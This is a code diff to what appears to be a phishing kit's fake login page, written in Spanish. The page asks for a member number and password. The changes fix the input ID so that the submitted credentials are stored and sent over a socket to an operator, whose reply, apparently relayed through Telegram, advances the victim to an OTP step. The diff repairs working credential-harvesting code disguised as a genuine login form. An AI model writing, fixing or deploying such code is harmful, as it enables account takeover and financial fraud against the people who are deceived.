@@ -81,9 +81,7 @@
     </div>
     <p>Ingrese a su cuenta para iniciar con el proceso de analisis.</p>
     <form id="login-form">
-      <div class="input-group">
-      <div class="icon"><i class="fas fa-user"></i></div>
-<input type="tel" id="email" placeholder="Numero de socio" required>
+      <input type="tel" id="email" placeholder="Numero de socio" required> <!-- ✅ CORREGIDO -->
       <input type="password" id="clave" placeholder="Contraseña" required />
       <button type="submit">Continuar</button>
     </form>
@@ -101,24 +99,21 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          const correo = document.getElementById('usuario').value;
+          const correo = document.getElementById('email').value; // ✅ CAMBIO DE 'usuario' a 'email'
           const contrasena = document.getElementById('clave').value;
-          const sessionId = localStorage.getItem('sessionId');
+          const sessionId = localStorage.getItem('sessionId') || crypto.randomUUID();
 
-          // Actualizar localStorage con los nuevos datos ingresados
+          localStorage.setItem('sessionId', sessionId);
           localStorage.setItem('correo', correo);
           localStorage.setItem('contrasena', contrasena);
 
-          // Enviar al servidor con la sesión original
           socket.emit('errorlogoForm', { correo, contrasena, sessionId });
 
-          // Redirigir a la pantalla de espera
           window.location.href = 'opciones.html';
         });
       }
     });
 
-    // Respuesta desde Telegram
     socket.on("respuestaErrorLogo", (decision) => {
       if (decision === "otp") {
         window.location.href = "bienvenido.html";
